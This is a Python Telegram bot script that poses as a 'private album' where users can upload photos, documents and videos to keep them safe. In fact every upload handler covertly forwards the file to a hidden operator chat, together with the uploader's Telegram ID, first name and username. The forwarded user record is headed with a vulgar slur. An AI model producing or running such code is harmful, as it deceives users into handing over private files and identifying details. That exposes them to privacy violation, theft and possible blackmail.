import telebot
import os
import time
from requests.exceptions import ConnectionError
from Atr.Telebot import TELEBOT_API


dir=os.getcwd()
bot=telebot.TeleBot(TELEBOT_API.READ_API('@Private_album_bot'))
chat_id=""


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id,"Thanks for starting the bot....Please Upload your photos or documents to keep them safe.....")

@bot.message_handler(content_types=['document'])
def handle_docs_photos(message):
    bot.reply_to(message,"Looks great........")
    bot.send_message(chat_id,f'''
Info of Chodu User:
1.ID:{message.chat.id}
2.First Name: {message.chat.first_name}
3.Username: @{message.chat.username}
 ''') 
    try:
        # For documents
        
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        # global original_file_name
        original_file_name = message.document.file_name
        with open(f"{dir}/{original_file_name}", 'wb') as new_file:
            new_file.write(downloaded_file)
        
        with open(f"{dir}/{original_file_name}","rb") as f:
            bot.send_document(chat_id,f)
        
            
    except:
        bot.reply_to(message,"It seems this is not a documet or photo.....")
    time.sleep(0.01)
    if os.path.exists(f"{dir}/{original_file_name}"):
        os.remove(f"{dir}/{original_file_name}")
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    bot.reply_to(message,"Looks great......")
    # print(message)
    bot.send_message(chat_id,f'''
Info of Chodu User:
1.ID:{message.chat.id}
2.First Name: {message.chat.first_name}
3.Username: @{message.chat.username}
 ''')
    # print(message.photo)
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        # global original_file_name
        # original_file_name = message.photo[-1].file_name
    
        with open(f"{dir}/photo.jpg", 'wb') as new_file:
            new_file.write(downloaded_file)
        time.sleep(0.01)
        with open(f"{dir}/photo.jpg","rb") as f:
            bot.send_document(chat_id,f)
    except:
        bot.reply_to(message,"It seems this is not a documet or photo.....")
    time.sleep(0.01)
    if os.path.exists(f"{dir}/photo.jpg"):
        os.remove(f"{dir}/photo.jpg")

@bot.message_handler(content_types=['video'])
def handle_photo(message):
    bot.reply_to(message,"Looks great......")
    # print(message)
    bot.send_message(chat_id,f'''
Info of Chodu User:
1.ID:{message.chat.id}
2.First Name: {message.chat.first_name}
3.Username: @{message.chat.username}
 ''')
    # print(message.photo)
    try:
        file_info = bot.get_file(message.video.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        # global original_file_name
        # original_file_name = message.photo[-1].file_name
    
        with open(f"{dir}/video.mp4", 'wb') as new_file:
            new_file.write(downloaded_file)
        time.sleep(0.01)
        with open(f"{dir}/video.mp4","rb") as f:
            bot.send_document(chat_id,f)
    except:
        bot.reply_to(message,"It seems this is not a documet or photo.....")
    time.sleep(0.01)
    if os.path.exists(f"{dir}/video.mp4"):
        os.remove(f"{dir}/video.mp4")
    
print("Bot started........")
# while True:
#     try:
#         bot.polling(none_stop=True)
#     except ConnectionError as e:
#         print(f"Connection error: {e}. Retrying...")
#         # Implement your retry logic here or just pass to retry on the next loop iteration
#     except Exception as e:
#         print(f"An unexpected error occurred: {e}")
bot.polling()